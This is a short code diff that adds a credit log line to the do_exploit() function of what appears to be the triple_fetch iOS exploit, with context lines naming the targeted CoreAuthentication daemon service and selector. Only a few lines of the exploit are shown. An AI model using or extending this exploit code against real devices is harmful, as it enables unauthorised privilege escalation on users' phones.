@@ -946,6 +946,7 @@ sploit(
 
 int do_exploit() {
 //#if 0
+  logMsg("UI Created by @JosephShenton, triple_fetch exploit created by Ian Beer of Google Project Zero.\n");
   logMsg("starting exploit\n");
   char* target_service_name = "com.apple.CoreAuthentication.daemon";
   char* target_selector = "connectToExistingContext:callback:reply:";
